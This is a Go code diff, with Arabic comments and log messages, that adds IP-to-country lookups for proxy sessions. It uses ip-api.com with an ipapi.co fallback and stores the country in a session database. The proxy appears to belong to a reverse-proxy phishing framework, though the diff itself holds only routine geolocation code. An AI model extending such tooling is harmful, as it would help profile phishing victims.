@@ -616,10 +616,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 
-									// إضافة معلومات البلد إلى قاعدة البيانات
+									// حفظ معلومات البلد مباشرة بعد تعيينها (قبل أي عمليات أخرى)
 									if session.CountryCode != "" || session.Country != "" {
 										if err := p.db.SetSessionCountryInfo(session.Id, session.CountryCode, session.Country); err != nil {
-											log.Error("database: %v", err)
+											log.Error("[%d] فشل في حفظ معلومات البلد: %v", sid, err)
+										} else {
+											log.Success("[%d] تم حفظ معلومات البلد في قاعدة البيانات بنجاح", sid)
 										}
 									}
 
@@ -2639,47 +2641,107 @@ func getIPGeoInfo(ipAddress string) (countryCode string, country string) {
 	parts := strings.Split(ipAddress, ":")
 	cleanIP := parts[0]
 	
-	// استخدام خدمة ipapi.co للحصول على معلومات البلد
+	log.Debug("محاولة الحصول على معلومات البلد من عنوان IP: %s", cleanIP)
+	
+	// استخدام خدمة ip-api.com للحصول على معلومات البلد
 	url := "http://ip-api.com/json/" + cleanIP + "?fields=status,countryCode,country"
 	
 	client := &http.Client{
-		Timeout: 3 * time.Second,
+		Timeout: 5 * time.Second,
 	}
 	
 	resp, err := client.Get(url)
 	if err != nil {
 		log.Error("فشل استعلام خدمة تحديد موقع IP: %v", err)
-		return "", ""
+		return tryBackupGeoService(cleanIP)
 	}
 	defer resp.Body.Close()
 	
 	if resp.StatusCode != http.StatusOK {
 		log.Error("خدمة تحديد موقع IP أعادت رمز حالة غير صحيح: %d", resp.StatusCode)
+		return tryBackupGeoService(cleanIP)
+	}
+	
+	var result map[string]interface{}
+	bodyBytes, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		log.Error("فشل قراءة استجابة خدمة تحديد موقع IP: %v", err)
+		return tryBackupGeoService(cleanIP)
+	}
+	
+	err = json.Unmarshal(bodyBytes, &result)
+	if err != nil {
+		log.Error("فشل فك ترميز استجابة خدمة تحديد موقع IP: %v، الاستجابة: %s", err, string(bodyBytes))
+		return tryBackupGeoService(cleanIP)
+	}
+	
+	status, ok := result["status"].(string)
+	if !ok || status != "success" {
+		log.Error("خدمة تحديد موقع IP أعادت حالة غير ناجحة: %v", result["status"])
+		return tryBackupGeoService(cleanIP)
+	}
+	
+	cc, ok := result["countryCode"].(string)
+	if ok && cc != "" {
+		countryCode = cc
+	} else {
+		log.Warning("رمز البلد غير متوفر أو فارغ")
+	}
+	
+	c, ok := result["country"].(string)
+	if ok && c != "" {
+		country = c
+	} else {
+		log.Warning("اسم البلد غير متوفر أو فارغ")
+	}
+	
+	// طباعة النتيجة
+	log.Debug("تم الحصول على معلومات البلد: رمز البلد=%s، البلد=%s", countryCode, country)
+	
+	return countryCode, country
+}
+
+// دالة احتياطية للحصول على معلومات البلد من خدمة بديلة
+func tryBackupGeoService(ipAddress string) (countryCode string, country string) {
+	log.Debug("محاولة استخدام خدمة بديلة للحصول على معلومات البلد")
+	
+	// استخدام خدمة ipapi.co للحصول على معلومات البلد
+	url := "https://ipapi.co/" + ipAddress + "/json/"
+	
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+	}
+	
+	resp, err := client.Get(url)
+	if err != nil {
+		log.Error("فشل استعلام خدمة تحديد موقع IP البديلة: %v", err)
+		return "", ""
+	}
+	defer resp.Body.Close()
+	
+	if resp.StatusCode != http.StatusOK {
+		log.Error("خدمة تحديد موقع IP البديلة أعادت رمز حالة غير صحيح: %d", resp.StatusCode)
 		return "", ""
 	}
 	
 	var result map[string]interface{}
 	err = json.NewDecoder(resp.Body).Decode(&result)
 	if err != nil {
-		log.Error("فشل فك ترميز استجابة خدمة تحديد موقع IP: %v", err)
+		log.Error("فشل فك ترميز استجابة خدمة تحديد موقع IP البديلة: %v", err)
 		return "", ""
 	}
 	
-	status, ok := result["status"].(string)
-	if !ok || status != "success" {
-		log.Error("خدمة تحديد موقع IP أعادت حالة غير ناجحة")
-		return "", ""
-	}
-	
-	cc, ok := result["countryCode"].(string)
-	if ok {
+	cc, ok := result["country_code"].(string)
+	if ok && cc != "" {
 		countryCode = cc
 	}
 	
-	c, ok := result["country"].(string)
-	if ok {
+	c, ok := result["country_name"].(string)
+	if ok && c != "" {
 		country = c
 	}
+	
+	log.Debug("الخدمة البديلة - تم الحصول على معلومات البلد: رمز البلد=%s، البلد=%s", countryCode, country)
 	
 	return countryCode, country
 }
